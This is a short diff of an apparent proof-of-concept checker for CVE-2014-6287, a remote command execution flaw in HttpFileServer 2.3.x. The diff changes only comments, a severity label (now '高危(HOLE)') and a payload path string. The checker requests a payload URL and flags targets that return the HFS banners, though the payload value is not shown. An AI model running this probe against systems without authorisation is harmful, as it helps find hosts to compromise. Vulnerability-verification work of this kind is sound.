@@ -1,4 +1,6 @@
-#!/usr/bin/env python
+# !/usr/bin/env python
+# -*- coding: utf-8 -*-
+
 # Exploit Title: HttpFileServer 2.3.x Remote Command Execution
 # Version: 2.3.x
 # CVE : CVE-2014-6287
@@ -21,7 +23,7 @@ class P(T):
         url = arg + payload
         code, head, res, errcode, _ = curl.curl(url)
         if code == 200 and "HFS 2.3" in head and "HttpFileServer v2.3" in res:
-            output(url,result,'hole')
+            output(url,result,'高危(HOLE)')
         del curl
         return result
 
@@ -32,7 +34,7 @@ def output(url,result,label):
     result['VerifyInfo'] = {}
     result['VerifyInfo']['type']=' Remote Command Execution'
     result['VerifyInfo']['URL'] =url
-    result['VerifyInfo']['payload']='/root/github/poccreate/httpfileserver.py'
+    result['VerifyInfo']['payload']='/poccreate/httpfileserver.py'
     result['VerifyInfo']['level']=label
     result['VerifyInfo']['result'] =info
 
